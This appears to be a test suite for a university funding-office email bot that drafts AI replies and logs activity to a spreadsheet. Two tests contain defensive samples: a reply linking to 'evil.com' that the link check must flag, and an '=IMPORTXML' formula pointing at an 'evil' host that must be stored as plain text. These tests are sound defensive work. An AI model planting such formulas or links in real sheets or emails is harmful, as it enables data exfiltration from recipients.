// Tests for the production features: start-time cutoff, run time limit,
// in-Google eval, weekly summary.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { makeEnv, anthropicAnswer } from './harness.mjs';

const LIVE = { MODE: 'live' };
const STUDENT = 'Jane Doe <jdoe@ucsd.edu>';

test('only emails that arrive after the bot was turned on are handled; old ones are ignored silently', () => {
  const env = makeEnv({ settings: LIVE, props: { BOT_START_TIME: String(Date.parse('2026-10-30T12:00:00Z')) } });
  env.addMessage({ from: STUDENT, date: new Date('2026-10-29T12:00:00Z') });
  env.addMessage({ from: 'Bob <bob@ucsd.edu>', date: new Date('2026-10-30T13:00:00Z') });
  env.run();
  assert.equal(env.fetches.length, 1);
  assert.equal(env.sent.length, 1);
  assert.equal(env.sent[0].headers.To, 'bob@ucsd.edu');
  assert.equal(env.activity().length, 1, 'old emails are not even logged');
  env.run();
  assert.equal(env.fetches.length, 1, 'and they stay ignored');
});

test('the first run remembers its start time, so emails already in the inbox are never answered', () => {
  const env = makeEnv({ settings: LIVE, props: { BOT_START_TIME: '' } });
  env.addMessage({ from: STUDENT, date: new Date(Date.now() - 60_000) });
  env.run();
  assert.equal(env.fetches.length, 0);
  assert.ok(Number(env.props.BOT_START_TIME) > Date.now() - 10_000);
});

test('resetBotMemory moves the start time back so test emails can be re-run', () => {
  const env = makeEnv({ props: { BOT_START_TIME: String(Date.now()) } });
  env.addMessage({ from: STUDENT, date: new Date(Date.now() - 3600_000) });
  env.run();
  assert.equal(env.fetches.length, 0);
  env.bot.resetBotMemory();
  env.run();
  assert.equal(env.fetches.length, 1);
});

test('a run stops before Google’s 6-minute limit and the next run continues', () => {
  const env = makeEnv({ settings: LIVE });
  env.addMessage({ from: STUDENT });
  env.addMessage({ from: 'Bob <bob@ucsd.edu>' });
  const realNow = Date.now;
  let fake = realNow();
  env.setNow(() => fake);
  // Each AI call "takes" 5 minutes.
  env.setAiHandler(() => { fake += 5 * 60 * 1000; return anthropicAnswer({ category: 'faq', reply: 'Hi,\nSee https://tescatucsd.org/funding', reason: 'x' }); });
  env.run();
  assert.equal(env.sent.length, 1, 'first run handles one email, then stops');
  env.run();
  assert.equal(env.sent.length, 2, 'second run picks up the other one');
});

test('scoreEvalCase grades category, required text, forbidden text and the link check', () => {
  const { bot } = makeEnv();
  const s = bot.normalizeSettings({});
  const c = { id: 'x', expect: 'faq', mustInclude: ['4 weeks'], mustNotInclude: ['guarantee'] };
  assert.equal(bot.scoreEvalCase(c, { category: 'faq', reply: 'Apply 4 weeks before.' }, s).pass, true);
  assert.match(bot.scoreEvalCase(c, { category: 'not_stf', reply: '' }, s).problems[0], /expected faq/);
  assert.match(bot.scoreEvalCase(c, { category: 'faq', reply: 'We guarantee 4 weeks' }, s).problems.join(), /forbidden/);
  assert.match(bot.scoreEvalCase(c, { category: 'faq', reply: '4 weeks, see https://evil.com' }, s).problems.join(), /safety check/);
  assert.equal(bot.scoreEvalCase({ id: 'y', expect: ['faq', 'needs_decision'] }, { category: 'needs_decision', reply: '' }, s).pass, true);
});

test('runEval grades every built-in test email, writes the Eval tab, and sends no email', () => {
  const env = makeEnv({ aiHandler: () => anthropicAnswer({ category: 'needs_decision', reply: '', reason: 'x' }) });
  const n = env.consts.EVAL_CASES.length;
  assert.ok(n >= 25);
  const summary = env.bot.runEval();
  assert.equal(env.fetches.length, n);
  assert.equal(env.sent.length, 0);
  assert.equal(env.sheets.cp.Eval.length, n);
  assert.match(summary, /Escalations: 100%/);
  assert.match(summary, /Overall: \d+%/);
});

test('weekly summary counts the last 7 days and lists open "needs decision" emails', () => {
  const { bot } = makeEnv();
  const now = new Date('2026-11-02T17:00:00Z');
  const day = (d) => new Date(now.getTime() - d * 86400000);
  const act = (d, decision, cost = 0) => [day(d), 'contact@', 'a@ucsd.edu', 's', decision, '', '', '', 'live', '', 0, 0, cost];
  const text = bot.buildWeeklySummary([
    act(1, 'answered', 0.001), act(2, 'answered', 0.001), act(3, 'needs decision', 0.001),
    act(4, 'not stf'), act(5, 'skipped: robot'), act(10, 'answered', 5),
  ], [
    [day(3), 'late@ucsd.edu', 'Late form', 'extension', 'link', false],
    [day(9), 'done@ucsd.edu', 'Old', 'x', 'link', true],
  ], now);
  assert.match(text, /Emails looked at: 5/);
  assert.match(text, /Answered by the bot: 2/);
  assert.match(text, /fully handled by the bot: 67%/);
  assert.match(text, /AI cost: \$0\.00/);
  assert.match(text, /Open "needs decision" emails: 1\n- late@ucsd\.edu: Late form/);
  assert.doesNotMatch(text, /TEST MODE/);
});

test('weeklySummary emails the alert address', () => {
  const env = makeEnv({ settings: { ALERT_EMAILS: 'tech@ucsd.edu' } });
  env.addMessage({ from: STUDENT });
  env.run();
  env.sheets.cp['Activity Log'].unshift(['header row']); // the real tab has headers in row 1
  env.bot.weeklySummary();
  assert.equal(env.alerts.length, 1);
  assert.equal(env.alerts[0].to, 'tech@ucsd.edu');
  assert.match(env.alerts[0].body, /TEST MODE[\s\S]*Answered by the bot: 1/);
});

test('an email sent to both contact@ and board@ gets only one reply (from contact@)', () => {
  const both = [{ name: 'To', value: 'TESC <contact@tescatucsd.org>' }, { name: 'Cc', value: 'board@tescatucsd.org, x@ucsd.edu' }];
  const contact = makeEnv({ settings: LIVE, me: 'contact@tescatucsd.org' });
  contact.addMessage({ from: STUDENT, headers: both });
  contact.run();
  assert.equal(contact.sent.length, 1);

  const board = makeEnv({ settings: LIVE, me: 'board@tescatucsd.org' });
  board.addMessage({ from: STUDENT, headers: both });
  board.addMessage({ from: 'Bob <bob@ucsd.edu>', headers: [{ name: 'To', value: 'board@tescatucsd.org' }] });
  board.run();
  assert.equal(board.fetches.length, 1, 'no AI call for the shared email');
  assert.equal(board.sent.length, 1, 'board@ still answers emails sent only to it');
  assert.equal(board.sent[0].headers.To, 'bob@ucsd.edu');
  assert.match(board.activity()[0][4], /also sent to contact@tescatucsd\.org/);
});

// ---------- Gmail quota and memory fixes (version 1.1) ----------

test('a run with no new email does not open any email (saves the daily Gmail quota)', () => {
  const env = makeEnv({ settings: { MODE: 'live' } });
  for (let i = 0; i < 20; i++) env.addMessage({ from: 'News <news@example.com>', subject: 'Newsletter ' + i });
  env.run();
  const opened = env.gmailCalls.getMessages;
  env.run();
  env.run();
  assert.equal(env.gmailCalls.getMessages, opened, 'already-handled threads are skipped without opening them');
  assert.equal(env.activity().length, 20, 'each email is logged once');
});

test('the bot memory is split into pieces so it never hits the 9 KB limit', () => {
  const env = makeEnv({ settings: { MODE: 'live' } });
  const seen = {};
  for (let i = 0; i < 1000; i++) seen['thread' + String(i).padStart(10, '0')] = Date.now() + '/1';
  env.bot.saveState_({ seen, attempts: {}, retryAt: {} }, 2);
  const big = Object.entries(env.props).filter(([, v]) => v.length > 9000);
  assert.deepEqual(big, [], 'no single setting is over 9 KB');
  assert.ok(Number(env.props.BOT_SEEN_COUNT) > 1, 'memory was stored in more than one piece');
  assert.equal(Object.keys(env.bot.loadState_().seen).length, 1000, 'everything comes back');
  // Shrinking deletes the leftover pieces.
  env.bot.saveState_({ seen: { a: Date.now() + '/1' }, attempts: {}, retryAt: {} }, 2);
  assert.equal(env.props.BOT_SEEN_COUNT, '1');
  assert.equal(env.props.BOT_SEEN_1, undefined);
  // Threads older than the search window are forgotten.
  env.bot.saveState_({ seen: { old: (Date.now() - 10 * 86400000) + '/1' }, attempts: {}, retryAt: {} }, 2);
  assert.deepEqual(Object.keys(env.bot.loadState_().seen), []);
});

test('memory from version 1.0 is still respected, so old emails are not handled again', () => {
  const env = makeEnv({ settings: { MODE: 'live' } });
  const { id } = env.addMessage({ from: 'Jane Doe <jdoe@ucsd.edu>' });
  env.props.BOT_STATE = JSON.stringify({ processed: { [id]: Date.now() } });
  env.run();
  assert.equal(env.sent.length, 0);
  assert.equal(env.fetches.length, 0);
});

test('daily AI limit: logged once, and waiting emails are answered later', () => {
  const env = makeEnv({ settings: { MODE: 'live', DAILY_AI_CALL_LIMIT: 1 } });
  let now = Date.now();
  env.setNow(() => now);
  env.addMessage({ from: 'Jane Doe <jdoe@ucsd.edu>' });
  env.addMessage({ from: 'Bob <bob@ucsd.edu>' });
  env.addMessage({ from: 'Robot <noreply@ucsd.edu>' });
  env.run();
  env.run();
  now += 31 * 60 * 1000;
  env.run();
  assert.equal(env.sheets.cp.Errors.length, 1, 'the limit is logged once, not on every run');
  assert.equal(env.sent.length, 1);
  assert.ok(env.activity().some((r) => /robot/.test(r[4])), 'emails that need no AI are still handled');
  // Next day the waiting email gets its answer.
  now += 24 * 3600 * 1000;
  env.bot.Utilities.formatDate = (d) => new Date(now).toISOString().slice(0, 10);
  env.run();
  assert.equal(env.sent.length, 2);
});

test('dashboard check runs the bot only when a new email arrived, at most every 30 seconds', () => {
  const env = makeEnv({ settings: { MODE: 'live' } });
  let now = Date.now();
  env.setNow(() => now);
  env.addMessage({ from: 'Jane Doe <jdoe@ucsd.edu>' });
  env.bot.checkInboxNow();
  assert.equal(env.sent.length, 1);
  now += 40 * 1000;
  env.bot.checkInboxNow(); // our own reply is the newest email now: a run that does nothing
  const searches = env.gmailCalls.search;
  now += 40 * 1000;
  env.bot.checkInboxNow(); // nothing new
  assert.equal(env.gmailCalls.search, searches + 1, 'only one cheap check, no bot run');
  env.addMessage({ from: 'Bob <bob@ucsd.edu>', date: new Date(now) });
  env.bot.checkInboxNow(); // new email, and the last run was 40 s ago
  assert.equal(env.sent.length, 2);
  env.addMessage({ from: 'Cat <cat@ucsd.edu>', date: new Date(now + 1000) });
  now += 5 * 1000;
  env.bot.checkInboxNow();
  assert.equal(env.sent.length, 2, 'too soon after the last run: the timer or the next check handles it');
  now += 30 * 1000;
  env.bot.checkInboxNow();
  assert.equal(env.sent.length, 3);
});

test('email text that looks like a formula, number or date is stored as plain text', () => {
  const { bot } = makeEnv();
  assert.equal(bot.safeCell_('=IMPORTXML("http://evil")'), "'=IMPORTXML(\"http://evil\")");
  assert.equal(bot.safeCell_('+1 question'), "'+1 question");
  assert.equal(bot.safeCell_('1/2'), "'1/2");
  assert.equal(bot.safeCell_('12345e6789012345'), "'12345e6789012345");
  assert.equal(bot.safeCell_('Travel fund'), 'Travel fund');
  assert.equal(bot.safeCell_(5), 5);
});

test('Needs Decision rows go in the first empty row, not below the old checkboxes', () => {
  const rows = [['Time', 'From', 'Subject', 'Why', 'Open in Gmail', 'Done?'], ...Array.from({ length: 50 }, () => ['', '', '', '', '', false])];
  const env = makeEnv({ settings: { MODE: 'live' } });
  env.sheets.cp['Needs Decision'] = rows;
  env.bot.logNeedsDecision({ from: 'a@ucsd.edu', subject: 'Exception', why: 'x', threadId: 't1' });
  assert.equal(rows[1][1], 'a@ucsd.edu');
  assert.equal(rows.length, 51);
});
